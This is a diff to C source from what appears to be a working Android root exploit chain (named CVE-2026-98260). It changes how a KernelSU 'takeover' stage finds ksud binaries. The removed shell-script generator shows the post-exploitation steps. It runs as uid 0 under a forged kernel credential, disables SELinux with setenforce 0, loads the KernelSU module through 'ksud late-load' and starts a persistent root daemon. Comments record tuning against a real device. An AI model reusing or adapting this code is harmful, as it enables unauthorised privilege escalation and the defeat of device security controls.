@@ -27,6 +27,7 @@
 #include <unistd.h>
 
 #include "ksu.h"
+#include "ksu_script.h"
 
 int pc98260_su_main(int argc, char **argv);
 
@@ -130,30 +131,58 @@ static void derive_kmi(char *out, size_t out_size)
 	snprintf(out, out_size, "android15-6.6");
 }
 
-static int find_ksud(char *out, size_t out_size)
+/*
+ * 收集**所有**可用的 ksud 候选，按优先级排序（去重）。
+ *
+ * 2026-10-31 真机教训：设备上同时存在两个不同版本的 ksud ——
+ *   · 管理器里的 libksud.so（4990848 B，旧版，只认 -h/-V，不支持
+ *     late-load / daemon）；
+ *   · APK 自带的 assets/ksu/ksud（6402736 B，sha256 049491e2b4cc0a6c...）。
+ * 旧实现只取第一个存在的候选（永远是管理器那个），于是接管时
+ * `late-load` 只打印一段帮助、daemon 起不来，最终「模块加载了但没有 su」。
+ *
+ * 现在把候选**全部**交给接管脚本，由脚本按顺序试，直到某个构建既能
+ * 注册模块、又能把 ksud daemon 拉起来（脚本会记 ksud_used=）。
+ *
+ * 返回候选个数（0 = 一个都没有）。
+ */
+static int find_ksud_list(char out[][512], int max)
 {
 	const char *env = getenv("CVE98260_KSUD");
 	const char *candidates[4];
 	char built[512];
 	size_t i;
+	int n = 0;
 
+	if (!out || max <= 0)
+		return 0;
 	snprintf(built, sizeof(built), "%s/ksud", ksu_home());
 	candidates[0] = env;
 	candidates[1] = built;
 	candidates[2] = "/data/local/tmp/ksud";
 	candidates[3] = "/data/adb/ksud";
-	for (i = 0; i < 4; i++) {
+	for (i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
 		struct stat st;
+		int dup = 0;
+		int j;
+
 		if (!candidates[i] || !*candidates[i])
 			continue;
 		if (stat(candidates[i], &st))
 			continue;
 		if (!S_ISREG(st.st_mode))
 			continue;
-		snprintf(out, out_size, "%s", candidates[i]);
-		return 0;
+		for (j = 0; j < n; j++)
+			if (!strcmp(out[j], candidates[i]))
+				dup = 1;
+		if (dup)
+			continue;
+		if (n >= max)
+			break;
+		snprintf(out[n], 512, "%s", candidates[i]);
+		n++;
 	}
-	return -1;
+	return n;
 }
 
 /* Size of a file, or -1 when it cannot be stat'ed. Used to tell the bundled
@@ -197,129 +226,20 @@ static void ksu_sync(void)
 	(void)fdatasync(STDOUT_FILENO);
 }
 
-static int write_takeover_script(const char *path, const char *ksud,
-				 const char *kmi, const char *log)
-{
-	FILE *f = fopen(path, "w");
-	if (!f)
-		return -1;
-	fprintf(f, "#!/system/bin/sh\n");
-	fprintf(f, "# CVE-2026-98260 KSU takeover: this script is executed only by rootd (uid=0)\n");
-	fprintf(f, "# Shape copied from the device-proven PC flow\n");
-	fprintf(f, "# (CVE-2026-98260-NEW/tools/ksu_activate.sh:126-142):\n");
-	fprintf(f, "#   one late-load --kmi attempt, then (only if not live) one plain\n");
-	fprintf(f, "#   late-load. No --allow-shell, no wider ladder: the ladder was the\n");
-	fprintf(f, "#   only substantial deviation from the verified combination.\n");
-	fprintf(f, "KSUD='%s'\n", ksud);
-	fprintf(f, "KMI='%s'\n", kmi);
-	fprintf(f, "LOG='%s'\n", log);
-	/* sync after every marker: a panic mid-attempt must not cost us the
-	 * evidence of which attempt was running. */
-	fprintf(f, "echo \"[ksu] begin uid=$(id -u) enf=$(getenforce)\" > \"$LOG\"\n");
-	/* Identity check: the device carries a second, different ksud build under
-	 * /data/adb/ksud (4990848 B) while the bundled one is 6402736 B. Print the
-	 * size of whatever ksud actually gets used (find_ksud() has /data/adb/ksud
-	 * in its fallback chain) so a wrong build is visible in the log. */
-	fprintf(f, "SZ=$(stat -c %%s \"$KSUD\" 2>/dev/null)\n");
-	fprintf(f, "[ -z \"$SZ\" ] && SZ=$(ls -l \"$KSUD\" 2>/dev/null | awk '{print $5}')\n");
-	fprintf(f, "echo \"[ksu] ksud=$KSUD size=${SZ:-unknown}\" >> \"$LOG\"\n");
-	/* Note: 6402736 is the bundled build (sha256 049491e2b4cc0a6c...). */
-	fprintf(f, "echo \"[ksu] ksud_expected_size=6402736\" >> \"$LOG\"\n");
-	fprintf(f, "sync\n");
-	fprintf(f, "chmod 755 \"$KSUD\" 2>/dev/null\n");
-	fprintf(f, "setenforce 0 2>/dev/null\n");
-	fprintf(f, "echo \"[ksu] setenforce_rc=$? enf=$(getenforce 2>/dev/null)\" >> \"$LOG\"\n");
-	fprintf(f, "sync\n");
-	fprintf(f, "\n");
-	/*
-	 * live(): identical semantics to the PC script (ksu_activate.sh:54-56).
-	 * late-load registers the module asynchronously; probing /proc/modules
-	 * immediately after ksud returns gives a false negative ("rc=0 but
-	 * live=no"), so every probe sleeps 1s first. Case-insensitive like the
-	 * reference's `grep -qi`.
-	 */
-	fprintf(f, "live() { sleep 1; grep -qi kernelsu /proc/modules 2>/dev/null && echo yes || echo no; }\n");
-	fprintf(f, "\n");
-	fprintf(f, "LIVE=$(live)\n");
-	fprintf(f, "echo \"[ksu] live_initial=$LIVE\" >> \"$LOG\"\n");
-	fprintf(f, "if [ \"$LIVE\" = yes ]; then\n");
-	fprintf(f, "  echo '[ksu] already_live' >> \"$LOG\"\n");
-	fprintf(f, "  echo '[ksu] note: rc is not a criterion -- ksud returns 0 even on silent failure' >> \"$LOG\"\n");
-	fprintf(f, "  exit 0\n");
-	fprintf(f, "fi\n");
-	fprintf(f, "\n");
-	/* Attempt 1: the GUI-preferred single-parameter form (PC: ksu_activate.sh:132). */
-	fprintf(f, "echo \"[ksu] try: late-load --kmi $KMI\" >> \"$LOG\"\n");
-	fprintf(f, "\"$KSUD\" late-load --kmi \"$KMI\" >> \"$LOG\" 2>&1\n");
-	fprintf(f, "echo \"[ksu] rc=$?\" >> \"$LOG\"\n");
-	fprintf(f, "sync\n");
-	fprintf(f, "LIVE=$(live)\n");
-	fprintf(f, "echo \"[ksu] live=$LIVE\" >> \"$LOG\"\n");
-	fprintf(f, "\n");
-	/* Attempt 2 only when attempt 1 did not register the module (PC:136-140). */
-	fprintf(f, "if [ \"$LIVE\" != yes ]; then\n");
-	fprintf(f, "  echo '[ksu] try: late-load (no args, ksud picks the embedded KMI)' >> \"$LOG\"\n");
-	fprintf(f, "  \"$KSUD\" late-load >> \"$LOG\" 2>&1\n");
-	fprintf(f, "  echo \"[ksu] rc=$?\" >> \"$LOG\"\n");
-	fprintf(f, "  sync\n");
-	fprintf(f, "  LIVE=$(live)\n");
-	fprintf(f, "  echo \"[ksu] live=$LIVE\" >> \"$LOG\"\n");
-	fprintf(f, "fi\n");
-	fprintf(f, "\n");
-	/*
-	 * Do NOT start the ksud daemon from here.
-	 *
-	 * This script runs through rootd, i.e. as uid 0 with the *injected forged*
-	 * cred (SELinux: u:object_r:unlabeled:s0). Anything started from here
-	 * inherits that cred, and the cred lives in a page the kernel no longer owns
-	 * -- so the daemon could never be killed without risking a panic, and every
-	 * later attempt to reclaim those pages becomes a minefield.
-	 *
-	 * The PC reference starts it from a plain adb shell instead (run.py:572
-	 * `nohup /data/local/tmp/ksud &`), which gives the daemon a normal cred.
-	 * The host does the same after this step returns, so all we do here is report
-	 * the module state.
-	 */
-	/*
-	 * Start the ksud daemon -- restored on purpose.
-	 *
-	 * The baseline APK that is proven to root this device (GhostKey111.apk)
-	 * does exactly this, after the last late-load attempt and not inside the
-	 * attempt loop; without it no su channel exists afterwards and the run
-	 * reports "not rooted" even when the module did load. Real-device evidence
-	 * outweighs the earlier reasoning that skipping it avoids handing the
-	 * daemon a borrowed cred: the daemon is started here as uid 0, and any
-	 * concern about its cred belongs to the host-side startKsudDaemon() path,
-	 * not to dropping the step entirely.
-	 *
-	 * Guard with pidof so a daemon started by an earlier attempt is not
-	 * duplicated.
-	 */
-	fprintf(f, "if ! pidof ksud >/dev/null 2>&1; then\n");
-	fprintf(f, "  nohup \"$KSUD\" >/dev/null 2>&1 &\n");
-	fprintf(f, "  sleep 2\n");
-	fprintf(f, "fi\n");
-	fprintf(f, "echo \"[ksu] daemon pid=$(pidof ksud 2>/dev/null)\" >> \"$LOG\"\n");
-	fprintf(f, "\n");
-	fprintf(f, "echo '[ksu] note: rc is not a criterion -- ksud returns 0 even on silent failure' >> \"$LOG\"\n");
-	fprintf(f, "echo \"[ksu] end live=$LIVE\" >> \"$LOG\"\n");
-	fprintf(f, "exit 0\n");
-	fclose(f);
-	chmod(path, 0755);
-	return 0;
-}
 
 int ksu_takeover_main(int argc, char **argv)
 {
-	char ksud[512], kmi[64], script[512], log[512], cmd[1024];
+	char ksuds[4][512], kmi[64], script[512], log[512], cmd[1024];
 	char *su_argv[4];
 	int i, rc = 1;
 	int already = 0;
+	int n_ksuds;
 
 	(void)argc;
 	(void)argv;
 
-	if (find_ksud(ksud, sizeof(ksud))) {
+	n_ksuds = find_ksud_list(ksuds, 4);
+	if (n_ksuds <= 0) {
 		fprintf(stderr, "[ksu] error: ksud not found (assets/ksu/ksud not bundled?)\n");
 		return 1;
 	}
@@ -327,16 +247,18 @@ int ksu_takeover_main(int argc, char **argv)
 	snprintf(script, sizeof(script), "%s/ksu_takeover.sh", ksu_home());
 	snprintf(log, sizeof(log), "%s/ksu_takeover.log", ksu_home());
 
-	fprintf(stdout, "[ksu] ksud=%s kmi=%s uid=%u\n", ksud, kmi,
-		(unsigned)getuid());
+	fprintf(stdout, "[ksu] kmi=%s uid=%u candidates=%d\n", kmi,
+		(unsigned)getuid(), n_ksuds);
 	/*
 	 * Diagnostic: two different ksud builds live on the device -- the bundled
 	 * one is 6402736 B (sha256 049491e2b4cc0a6c...) while /data/adb/ksud is a
-	 * 4990848 B device build, and find_ksud() has the latter in its fallback
-	 * chain. Printing the size of whatever was actually picked tells us on the
-	 * next run whether a wrong build was used.
+	 * 4990848 B device build. Both are now tried in turn by the takeover
+	 * script, so print the size of every candidate: the one that actually
+	 * works is the one that gets a working ksud daemon (and therefore su).
 	 */
-	fprintf(stdout, "[ksu] ksud_size=%lld expected=6402736\n", file_size(ksud));
+	for (i = 0; i < n_ksuds; i++)
+		fprintf(stdout, "[ksu] candidate[%d]=%s size=%lld\n", i, ksuds[i],
+			file_size(ksuds[i]));
 	ksu_sync();
 
 	if (modules_have_kernelsu()) {
@@ -346,11 +268,12 @@ int ksu_takeover_main(int argc, char **argv)
 		goto done;
 	}
 
-	if (write_takeover_script(script, ksud, kmi, log)) {
+	if (ksu_write_takeover_script(script, ksuds, n_ksuds, kmi, log)) {
 		fprintf(stderr, "[ksu] error: cannot write %s\n", script);
 		ksu_sync();
 		return 1;
 	}
+	chmod(script, 0755);
 	/* The script itself is on disk before anything risky runs; make sure the
 	 * fact that we got this far is durable too. */
 	ksu_sync();
